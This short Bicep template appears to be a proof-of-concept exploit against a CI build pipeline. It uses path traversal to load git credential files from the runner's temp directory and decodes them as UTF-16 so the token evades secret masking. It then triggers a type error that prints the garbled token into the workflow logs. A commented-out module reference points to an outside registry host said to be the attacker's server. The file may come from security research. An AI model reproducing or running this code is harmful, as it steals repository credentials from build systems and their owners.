var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')

// Read UTF-8 file as UTF-16 - bytes will be misinterpreted, producing
// garbled output that might not match the token pattern
var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
// output garbledContent string = garbled

// // Also try reading as UTF-16BE (big endian)
// var garbled2 = loadTextContent(credFiles[0].relativePath, 'utf-16BE')
// output garbledBE string = garbled2


// Type error leaks garbled token to stderr (appears in workflow logs)
var leak int = garbled

output x string = 'x'


// // OCI module reference - YOUR server holds this connection
// module delay 'br:lamian.robertprast.com/hold/x:v1' = {
//   name: 'd'
// }

